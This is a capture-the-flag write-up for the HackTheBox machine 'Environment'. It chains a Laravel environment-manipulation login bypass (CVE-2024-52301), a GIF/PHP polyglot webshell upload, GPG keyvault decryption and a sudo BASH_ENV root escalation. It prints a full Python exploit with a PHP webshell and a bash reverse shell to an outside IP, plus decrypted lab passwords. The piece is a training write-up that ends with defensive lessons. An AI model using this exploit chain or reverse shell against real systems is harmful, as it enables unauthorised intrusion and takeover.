---
title: "Environment"
date: 2025-05-03
type: docs
tags:
  - htb
  - linux
  - medium
  - laravel
  - cve-2024-52301
  - env-manipulation
  - file-upload
  - polyglot
  - gpg
  - keyvault
  - sudo
  - bash-env
---

<div class="callout callout-info">

**Box Info**

**Platform:** HackTheBox, **OS:** Linux (Debian 12), **Difficulty:** Medium, **Released:** 2025-05-03, **IP:** `10.10.11.67` , `environment.htb`

</div>

<div class="callout callout-abstract">

**Attack Path**

1. Laravel app. Appending `?--env=preprod` to the login POST flips the framework into a different environment where the login flow has a debug branch you can pass (**CVE-2024-52301**, Laravel environment detection via `argv`).
2. Authenticated, the profile image **upload** accepts a `GIF87a` prefixed polyglot with a trailing dot filename (`name.php.`). PHP webshell lands in `/storage/files/`. Shell as `www-data`.
3. `www-data` can read `/home/hish/.gnupg`. Copy it, list the secret key, and `gpg --decrypt /home/hish/backup/keyvault.gpg` yields a password vault. `su hish` with `marineSPm@ster!!`.
4. `hish` may `sudo /usr/bin/systeminfo`, and `sudo` keeps `BASH_ENV`. Point `BASH_ENV` at a script that SUIDs bash. Root.

</div>

<div class="callout callout-key">

**Credentials and Flags**


| Where | Value |
| --- | --- |
| GPG keyvault, `ENVIRONMENT.HTB` entry | `hish : marineSPm@ster!!` |
| `user.txt` | `/home/hish/user.txt` |
| `root.txt` | `/root/root.txt` |

</div>

---

## Overview

Environment chains a brand new framework CVE with two evergreen techniques. **CVE-2024-52301** is a subtle Laravel bug: Laravel reads `--env=` from the process `argv` to pick its environment, and PHP's `register_argc_argv` being on for the web SAPI means query string parameters land in `$_SERVER['argv']`, so `?--env=preprod` actually changes the running environment for that request. In `preprod` the login controller has a "just log the user in for testing" branch. After that it is a **polyglot upload** (GIF magic bytes plus a trailing dot to defeat the extension check) and a **`sudo` + `BASH_ENV`** privesc, where `sudo` was configured to keep `BASH_ENV` and bash sources whatever it points at before running a script.

Related Laravel boxes: [EarlyAccess](/writeups/hackthebox/linux/medium/earlyaccess/). Related polyglot upload: [Magic](/writeups/hackthebox/linux/medium/magic/), [PopCorn](/writeups/hackthebox/linux/medium/popcorn/), [Usage](/writeups/hackthebox/linux/easy/usage/). Related `sudo` env keeping (`LD_PRELOAD`, `BASH_ENV`, `PYTHONPATH`): this is the reference `BASH_ENV` case. Related GPG keyvault: [Bolt](/writeups/hackthebox/linux/medium/bolt/).

---

## Full Walkthrough

### Foothold, Laravel env bypass plus upload

<div class="callout callout-note">

**CVE-2024-52301, Laravel environment manipulation**

Laravel's `Application::detectEnvironment()` checks `$_SERVER['argv']` for `--env=<name>` before falling back to `APP_ENV`. When PHP-FPM runs with `register_argc_argv = On` (Debian's default), the query string is parsed into `argv`, so a request to `/login?--env=preprod` makes Laravel believe it is running in the `preprod` environment for that request. If any environment specific code path is weaker (debug login, verbose errors, disabled CSRF, a seeded test account), you now hit it. Patched in Laravel 6.20.45 / 7.30.7 / 8.83.28 / 9.52.17 / 10.48.23 / 11.31.0. On Environment, `preprod` lets the login controller authenticate you without valid credentials.

</div>

The full exploit: log in via `?--env=preprod`, upload a GIF/PHP polyglot, then trigger the shell.

```python
import requests, re, io

base_url = 'http://environment.htb'
login_url = base_url + '/login'
fname = "baphometpwn2.php"

def get_csrf(url, req_cookies={}):
    res = requests.get(url, cookies=req_cookies, allow_redirects=False)
    return re.search(r'name="_token" value="(\w+)"', res.text).group(1), res

def extract_cookies(res):
    return {'laravel_session': res.cookies.get('laravel_session'),
            'XSRF-TOKEN': res.cookies.get('XSRF-TOKEN')}

def login(csrf_token, cookies):
    data = {'email': 'email@example.com', 'password': 'admin',
            '_token': csrf_token, 'remember': 'True'}
    res = requests.post(login_url + '?--env=preprod', data=data,
                        cookies=cookies, allow_redirects=False)
    assert res.status_code == 302
    return extract_cookies(res)

def upload_webshell(cookies, fname):
    webshell = '''GIF87a
<html><body>
<form method="GET"><input name="cmd"><input type="SUBMIT"></form>
<pre><?php if(isset($_GET['cmd'])) system($_GET['cmd']); ?></pre>
</body></html>'''
    csrf_token, _ = get_csrf(base_url + '/management/profile', cookies)
    files = {'upload': (fname + '.', io.BytesIO(webshell.encode()), 'image/jpeg')}
    requests.post(base_url + '/upload', files=files, data={'_token': csrf_token},
                  cookies=cookies, allow_redirects=False)

def start_reverse_shell(fname):
    IP, PORT = '10.10.14.4', 9002
    url = (f'http://environment.htb/storage/files/{fname}'
           f'?cmd=bash+-c+%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F{IP}%2F{PORT}+0%3E%261%27')
    requests.get(url, allow_redirects=False)

csrf_token, res = get_csrf(login_url)
cookies = login(csrf_token, extract_cookies(res))
upload_webshell(cookies, fname)
start_reverse_shell(fname)
```

<div class="callout callout-note">

**The upload bypass**

The profile image handler checks the extension against a blocklist and sniffs the first bytes for an image signature. `GIF87a\n<?php ...` passes the signature check (valid GIF header), and a filename ending in a **trailing dot** (`shell.php.`) is stored by PHP/Laravel as `shell.php` on Linux (the dot is stripped) while defeating a naive `pathinfo($name, PATHINFO_EXTENSION)` check that sees an empty extension. The file lands in `/storage/files/` which is web served and runs as PHP.

</div>

### www-data to hish, GPG keyvault

The app DB dump in the web directory has hashes that do not crack. Instead, `hish`'s `~/.gnupg` is readable:

```console
$ cp -r /home/hish/.gnupg /tmp/.gnupg && chmod -R 700 /tmp/.gnupg
$ gpg --homedir /tmp/.gnupg --list-secret-keys --no-permission-warning
sec   rsa2048 2025-01-11 [SC]
      F45830DFB638E66CD8B752A012F42AE5117FFD8E
uid           [ultimate] hish_ <hish@environment.htb>

$ gpg --homedir /tmp/.gnupg --decrypt /home/hish/backup/keyvault.gpg
PAYPAL.COM      -> Ihaves0meMon$yhere123
ENVIRONMENT.HTB -> marineSPm@ster!!
FACEBOOK.COM    -> summerSunnyB3ACH!!
```

<div class="callout callout-note">

**Why a readable `.gnupg` is game over**

A GPG keyring directory contains the **private key** (`private-keys-v1.d/`, or `secring.gpg` on older setups). If you can copy it, you can import and use it with `--homedir` pointing at your copy, no passphrase prompt if the key has none (or a weak one you can crack with `gpg2john`). Anything the user encrypted "for themselves", backups, password vaults, notes, is now readable. Keep `~/.gnupg` mode `700` and never let a service account read another user's home.

</div>

```bash
su hish        # marineSPm@ster!!
```

### hish to root, sudo plus BASH_ENV

```console
$ sudo -l
Matching Defaults entries for hish on environment:
    env_reset, env_keep+="ENV BASH_ENV", use_pty
User hish may run the following commands on environment:
    (ALL) /usr/bin/systeminfo
```

<div class="callout callout-note">

**`BASH_ENV` injection**

`BASH_ENV` names a file that non interactive bash **sources before running a script**. `systeminfo` is a bash script, and `sudo` here is configured with `env_keep += "BASH_ENV"`, so `hish` controls a file that root's bash will execute.

</div>

```bash
cat > /home/hish/pwn.sh <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/bash && chmod u+s /tmp/bash
EOF
sudo BASH_ENV=/home/hish/pwn.sh /usr/bin/systeminfo
/tmp/bash -p
cat /root/root.txt
```

---

## Loot

| Flag | Location |
| --- | --- |
| `user.txt` | `/home/hish/user.txt` |
| `root.txt` | `/root/root.txt` |

---

## Lessons and Takeaways

- **Set `register_argc_argv = Off`** for the web SAPI, and patch Laravel. Query string to `argv` is a whole class of surprises.
- **Environment specific code must not be weaker.** No debug login, no disabled CSRF, no verbose errors that ship to a reachable `preprod`.
- **Validate uploads by re-encoding**, reject trailing dots and multi extensions, and serve `/storage` with PHP execution disabled.
- **`~/.gnupg`, `~/.ssh`, `~/.aws` must be `700` and owned by the user.** A service account should never be able to read them.
- **`env_keep` for `BASH_ENV`, `ENV`, `LD_PRELOAD`, `LD_LIBRARY_PATH`, `PYTHONPATH`, `PERL5LIB` defeats `sudo`.** Use `env_reset` with no keeps for anything that runs a script or interpreter.

---

## Related Writeups

- **Laravel:** [EarlyAccess](/writeups/hackthebox/linux/medium/earlyaccess/)
- **Polyglot / trailing dot upload bypass:** [Magic](/writeups/hackthebox/linux/medium/magic/), [PopCorn](/writeups/hackthebox/linux/medium/popcorn/), [Usage](/writeups/hackthebox/linux/easy/usage/), [Heal](/writeups/hackthebox/linux/medium/heal/)
- **GPG keyvault to credentials:** [Bolt](/writeups/hackthebox/linux/medium/bolt/)
- **`sudo` env keeping to root (`BASH_ENV` / `LD_PRELOAD`):** [Environment](/writeups/hackthebox/linux/medium/environment/) is the reference case

## References

- CVE-2024-52301 (Laravel) <https://github.com/laravel/framework/security/advisories/GHSA-gv7v-rgg6-548h>
- GTFOBins bash BASH_ENV <https://gtfobins.github.io/gtfobins/bash/#sudo>
- PHP register_argc_argv <https://www.php.net/manual/en/ini.core.php#ini.register-argc-argv>
